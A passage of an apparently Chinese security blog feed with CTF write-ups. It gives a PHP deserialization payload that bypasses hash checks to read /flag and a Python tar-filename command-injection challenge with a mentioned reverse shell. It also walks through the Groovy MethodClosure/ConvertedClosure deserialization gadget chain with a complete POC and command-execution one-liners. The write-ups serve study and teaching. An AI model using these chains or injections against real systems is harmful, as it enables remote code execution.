class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="comment">//注意date函数可以进行转义 把/f\l\a\g转化为/flag</span></span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="comment">//uniqid函数用于生成标识</span></span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="comment">//文件写入操作 把content作为内容写入的uuid中</span></span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="comment">//正则匹配替换 把uuid中的内容进行替换 赋给data</span></span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="comment">//输出data的内容即\flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unserialize(base64_decode($_GET[&#x27;code&#x27;])); </span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; file = <span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$a</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719202258630.png" alt="image-20230719202258630"></p><p><strong>总结</strong></p><ol><li>就是不使用数组  使用数字和字符来绕过<strong>md5</strong>和<strong>sha1</strong>  </li><li>就是使用转义可以避免<code>date</code>函数识别错误</li></ol><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>这里给了个附件  其中关键的核心代码是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br></pre></td></tr></table></figure><p>这里解释了一下上面创建文件新路径的代码</p><p><img src="../images/image-20230719203928179.png" alt="image-20230719203928179"></p><p><img src="../images/image-20230719204806115.png" alt="image-20230719204806115"></p><p>做题多的师傅一下子可能就会想到这里可能存在这个命令的同时执行</p><p>因为这个<code>savepath</code>最后的话是这个<code>filename</code>，所以说我们就可以控制这个<code>savepath</code>了   不能控制这个<code>directory</code> 的原因是因为这个的话上传路径我们不知道  生成的随机数也不可控</p><p><img src="../images/image-20230719205333200.png" alt="image-20230719205333200"></p><p>经过本地测试是能成功执行的  但是换到题目上的时候就没有回显  于是考虑数据外带一下<strong>(弹个shell方便一点)</strong></p><p><strong>考虑到弹shell有些符号是不给使用的  于是就尝试进行base64编码一下</strong></p><p><img src="../images/image-20230719210420750.png" alt="image-20230719210420750"></p><p><strong>这样在自己的服务器上就能收到shell了   由于我这里是公司  弹shell会被墙</strong></p><p>所以就不搞了</p><p><strong>总结</strong></p><ul><li>其实考察点就是<code>python</code>的代码审计和这个命令执行   能否想到的这个问题</li><li>现在的话也是可以想为现在的话是可以  <code>unzip</code>  <code>tar</code>  这些解压命令都可以进行<code>rce</code></li></ul><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2>]]></content>
      
      
      
        <tags>
            
            <tag> Nss-Ciscn2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/posts/8ddb4c74.html"/>
      <url>/posts/8ddb4c74.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="152b8dc2f8b97507f4f94d8930791be027f249f5a5f3fa42334d74987b4b64fb">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a4d0bfb7ff1045dab3f9bce09aed7c65b72a5cf1365959cc03b50a6d00ba51a256937bd6f838b61ede456b68db5c420595ea39afe5281b0bad21b2aa8e6e36748bedf23d55437eb2e9f41fd3c718a10215395c58674198df302f1469aa52eefd4ce1a3d2b1b82cc88d6e38c704c80465c2f4c15bb000943b7b9ba77782c958b4d6ad502180b504664fca00d6c2ad39e1b1f5ca92802ebdfb8fd885ab5a6f913503</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-Groovy</title>
      <link href="/posts/3776a7e3.html"/>
      <url>/posts/3776a7e3.html</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>Groovy是Apache 旗下的一种基于JVM的面向对象编程语言，既可以用于面向对象编程，也可以用作纯粹的脚本语言。在语言的设计上它吸纳了Python、Ruby 和 Smalltalk 语言的优秀特性，比如动态类型转换、闭包和元编程支持。 Groovy与 Java可以很好的互相调用并结合编程 ，比如在写 Groovy 的时候忘记了语法可以直接按Java的语法继续写，也可以在 Java 中调用 Groovy 脚本。比起Java，Groovy语法更加的灵活和简洁，可以用更少的代码来实现Java实现的同样功能。</p><h2 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h2><p><code>Groovy : 1.7.0-2.4.3</code></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span>  <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(mc, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先从这个类开始入手  (<strong>就是最后执行代码的地方</strong>)</p><p><code>org.codehaus.groovy.runtime.MethodClosure</code> 是方法闭包，使用闭包代表了一个对象的一个方法，可以很方便的调用。</p><p>MethodClosure 初始化时接收两个参数，一个是对象，一个是对象的方法名称。</p><p><img src="../images/image-20230718191350775.png" alt="image-20230718191350775"></p><p>​    </p><p>MethodClosure 中有一个 doCall 方法，调用 <code>InvokerHelper.invokeMethod()</code> 方法进行方法调用。</p><p><img src="../images/image-20230718191421942.png" alt="image-20230718191421942"></p><p>这里就是先使用<code>MethodClosure</code>来进行传值  <strong>分别是传一个对象和这个对象的某个方法</strong></p><p>由于这个<code>doCall</code>()是个<code>protected</code>方法   得使用反射调用 </p><p><img src="../images/image-20230718191723300.png" alt="image-20230718191723300"></p><p>这个最后一步的意思就是反射调用这个<code>doCall()</code>方法，然后传值是这个<code>calc</code></p><p><strong>m：就是等会会调用<code>doCall</code>这个方法</strong></p><p><strong><code>invoke(mc,&quot;calc&quot;)</code>  这个里面的<code>mc</code>指的是调用这个<code>MethodClosure</code> 里的<code>doCall</code>方法  <code>calc</code>是这个<code>daCall</code>的参数</strong></p><p><img src="../images/image-20230718192709132.png" alt="image-20230718192709132"></p><h3 id="String-execute-方法"><a href="#String-execute-方法" class="headerlink" title="String.execute() 方法"></a>String.execute() 方法</h3><p>Groovy 为 String 类型添加了 <code>execute()</code> 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 <code>&quot;ls&quot;.execute()</code> 这种方法来执行系统命令 “ls”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        println(<span class="string">&quot;whoami&quot;</span>.execute().text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里切记生成文件的要选groovy，不然会执行不了</p><p><img src="../images/image-20230718192832925.png" alt="image-20230718192832925"></p><p>其实就是使用<code>Runtime.getRuntime().exec()</code>来执行</p><p><strong>如果在java中可以这样写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        methodClosure.call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p> 分析一波 下个断点</p><p><img src="../images/image-20230718200009817.png" alt="image-20230718200009817"></p><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"><span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line"><span class="string">&#x27;calc&#x27;</span>.execute()</span><br><span class="line"><span class="string">&quot;$&#123;&quot;</span>calc<span class="string">&quot;.execute()&#125;&quot;</span></span><br><span class="line"><span class="string">&quot;$&#123;&#x27;calc&#x27;.execute()&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">&quot;cmd /c dir&quot;</span>.execute().text</span><br><span class="line">println <span class="string">&#x27;whoami&#x27;</span>.execute().text</span><br><span class="line">println <span class="string">&quot;$&#123;&quot;</span>whoami<span class="string">&quot;.execute().text&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;$&#123;&#x27;whoami&#x27;.execute().text&#125;&quot;</span></span><br><span class="line"><span class="type">def</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">println <span class="string">&quot;$&#123;cmd.execute().text&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p><code>org.codehaus.groovy.runtime.ConvertedClosure</code> 是一个通用适配器，用于将闭包适配到 Java 接口。ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。</p><p>ConvertedClosure 的构造方法接收一个 Closure 对象和一个 String 类型的 method 方法名，也就是说 ConvertedClosure 会代理这个 Closure 对象，当调用其 method 方法时，将会调用 ConvertedClosure 父类的 <code>invoke</code> 方法，除了 toString 和一些默认方法外，会调用 <code>invokeCustom</code> 方法。</p><p>如果初始化时指定的 method 与 <code>invokeCustom</code> 指定的 method 参数相同，则 <code>invokeCustom</code> 方法将会调用代理对象 Closure 的 call 方法执行传入参数执行。</p><p><img src="../images/image-20230718194334220.png" alt="image-20230718194334220"></p><p>看到这里就明白这条链的触发逻辑了。后面自然是使用 <code>AnnotationInvocationHandler</code> 将 <code>ConvertedClosure</code> 代理成 <code>Map</code> 类。这样在反序列化</p><h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><p><strong>最终的POC</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Groovy.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//封装我们需要执行的对象</span></span><br><span class="line"><span class="type">MethodClosure</span>    <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator.app&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line"><span class="type">ConvertedClosure</span> <span class="variable">closure</span>       <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 ConvertedClosure 的动态代理类实例</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">handler</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, handler);</span><br><span class="line"></span><br><span class="line">SerializeUtil.writeObjectToFile(invocationHandler, fileName);</span><br><span class="line">SerializeUtil.readFileObject(fileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">        MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230719191853074.png" alt="image-20230719191853074"></p><p>调用entrySet，然后触发invoke</p><p><img src="../images/image-20230719192046197.png" alt="image-20230719192046197"></p><p>调用了<code>ConversionHandler#invoke()</code>方法</p><p><img src="../images/image-20230719192158196.png" alt="image-20230719192158196"></p><p><img src="../images/image-20230719192238123.png" alt="image-20230719192238123"></p><p>接着就会调用到<code>ConvertedClosure#invokeCustom()</code>方法   <strong>并且由于这个</strong></p><p><strong><code>methodName</code>和这个传进来的<code>method</code>的<code>name</code>一样 </strong> 就会调用<code>call</code>()方法</p><p><img src="../images/image-20230719192521353.png" alt="image-20230719192521353"></p><p><img src="../images/image-20230719192653618.png" alt="image-20230719192653618"></p><p>这里的话到最后就rce了  </p>]]></content>
      
      
      
        <tags>
            
            <tag> java-Groovy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>show-SSTI</title>
      <link href="/posts/1834ebb1.html"/>
      <url>/posts/1834ebb1.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3e3697c7adbdf57731437fcf79fd69a597d248c9d07e1733faf9ede7192b4e40">1a90164da2a38547586d85c848ea23234cf9ef63a8ceedbc151c794cde2931a40020b66524494be431b39f09e43fc0e4e6b250f1d3b69a535265010090f01ab2bced285c367cd740722b37254f8c5679d20dceea1f03dc0ab235d0016af0a22a83aeb775b42102130cab2d9c2c5d78115acad857fde4b65dfc199819c0ef9d94f199dbb24274c8f27282f3a96982c8d6d5a50ecd766cac281e05cca46de6ae1c69241978348f203a9ab0e867e1e0c327afd563d58706794318eff6849370014bebe8bccdb4569fdaed092be75af9260e0366fd836229ab6dd4458e08b4b467cf6c35626db1abf3cad987d74559251992e61ef8942f94227f92f1d7586aad913c026d12ab8f6034d5343f397ac705cb4185d96e7c66705b5c473a9fdefa537632d66e5ef58fc00fd83fd5d2affa441493b2167f5084f20c02a38027540101238e2c23aaf59d86bf22038f67a55ddb4c7247d2fe69d3ccb441db4f1cab892dcc0a8a9d472e3a0439d251fa24ab7823c907eb1fccf8377fae75d1fa07e29b7296ce2048de2edacb890b2506506e799effe86baa6931779995e8d2949fc6511472dc54766d3552fee31879e89d421369063dd3b298c3babbcc3382ae39f9b236317fd34c31109ff0fb33a0fb2cc7b216f58df75114c380d09396de16ebb2aae279abc528cea3cfa49d93fd862e437f7103c6a1878831cd18611fb560d5c5d3d876471c2918c72819cd606ca67811e8fc7574736e3b4b2b869892ed4a39d166bfaadf9e335024d77dfc8e825e7cf493ceda6352b94334b61fbfa4c92dab3e7498895d0810a09a5e26540fe926200f948caa986a981e93c18def8a0c0858d22e714d26d677457e4b1524ad1289e48f539be1345ebafe7ec180a717e3325b0955e4f4c6a7a014bb3bb7b3e88d0727b2a6d4f94ba41d3d9e29206857b1873f50cb34a65cbb2f3e56a6ca3de9bf12db0f19c89f3d1024e891f41282ad01806935817796ac881f5e3509e8d3b88dd647296a0d8f5681a9e57f8fbecef002fbca4e0727510eeba7fa071fc716fd0560afd6f37d8e9072e96c310e55d58eb7c9a48451298187e32e150f4539ed5e8e065389309914eaf822228b5e520760b79b1d9dbca2664897b514de1163665ab4b2c7b7cbe4fb3d90c0f2060e0e8c57b02e5378192be536c98643865bed1ba192db79d091ecd6b72a1dba0e6cc4c6769b1f7cbbf212bd90f9d3ca9b998865143ed38b488842dda01fad6592831231ae938ccb8098bb0df75ada475807ce04b7bef9519518e60102e664d82d8e69b471ba69c6fb091923223952151e0fbbb8d913825f01fb6accc7e677d7fd301d532dfc514e1f2575e8c19e8a0760488ad434dd08f1b148b3e22b3d5f629605b1f798c5f34762bcb084ffaf9180c6649331c7bdef5936c45dee219362013987a031d82477859ce93400d74bd8c55e9117575f4e9cd9aea80f6bcd4c3e0c25e109df3a8d164e2bda93af047f765b899b34a64c80fd704706857ecd70cd4ef4b2ec5968cf75bc940f95b0c239ae0051e67a7c9f8c0ba98357a2cf81c0e38d8c664948319d297b5bc8b788217d86ccc393d941e24ad49607aa4d068e156fd82c6cf77a0678586552f1bd95ea425ba3972c9f983dca76969c57d517521b91b6011d7b56cb53f5285936ed671ceea84311569e09dcb3ab1da668d9e0677ae6046ada86c94305f40e0bdd42b52cd67ed17eaa64828c940e4ff762d38473f09e6ac8ce485cd8e9db4132fb5d304223a464c8d03e84f4262916f56745667d1d15c7d467589e12ed8756e3a1d8001218aba186ad2041fab666d62020ce1574d29749e01bb946b23a6c83c7dc2b4848cbd1f3546aa24e0463d5788a7f3ebea61ca56aadb6e84723c74a1a7816131b7dbcc4a98cd3c5f294f2bb6f6b143a482b8d0821d4b1bc143de845147c8f7044acc30ce63f9669b7451d804cd0222e85e712f34ddb6bcf53b177178486109333085afe67b2e495ad16d8aefe8d4d0f1460d8c0737d9a2c4b6f26b9725a778d8aac173e66b8319b359d8227c13d339cefce2beccc710f4a8c48ef518d6a47515be004359f6460f13af8802778fa335b1ca3c7e55116bef32f9fc49285f6689d33908f59b32efe8161fdc90c9dc0ffae075e68c7e82e3d303d16c065e5b7ac4424ed1734dfe6f2ef9f63c10f65f46de44e8fe4a307f60fc6ff9988be1bb7d6d552d2028bfdae579da83aa3aae1f0bc16134c2be8b216108631471c3c25f5b909c28a7dcf3aa2b6d41f6a8f2d1a9d547f3f27c865cea62713447a0ab4eaefc58e4368a0affdc4e9ab4e5399bc914a4e757f6e10b7d53cb6b3cfacc8277051535e78993c06c6465bf2f07c11b39de48a016d01ac4f3f794cf438723e9bfbc1853225610762d50b7fd3b370750570e82166d26e518c499dce0c0c3d99cce79aa5c9b25069088f6c4fc83ddc2eb63c6dcea6db74ef039afacc78b51a4097cc2fd5586bed78f60aef5cca7a221113ac89ca1e44032534eea8da11bb88e462af5bd14af7d46143bcd949299304b7828d57ac747632f649c8cf3ea07b64228501c00d44ff9243a08506d2a3bd087e9e3419e1db36705940ef9429bb10116c48c754f1904e20cd46242cdbf743a0ee966d1a56e4578f9a4dad42643097a9064c9ec89cbb9add3ddcb6825ed1da5658b0abf7489db2b95c0ea7bbb53c22cb42f9e62220239167132e26a597fdcb6a2441fbb7063eb8c0781f04cbc5c0590facfe629e121912dc0178681f57bcf724e1bc969e894629e527bfa36f60d91ecae20018fa004327ad688d4a03f69ca55f482f1fa41c99bc55356db8f217dc608ca7843fed9970c32f95115eba52ec984391a21a3eddfc12790cdb42bbe32246bfc7e01ed5ce61003f8f62b656c3dda6a9a473c3ca9cdf566184c3b151de59832258b73d90ffa6a31bebfdee628ca88a5c010e38ee1d7cbe977ec8639320b096d954ee1671e6801db7589916f31776e056e9ecb3f5040de53fb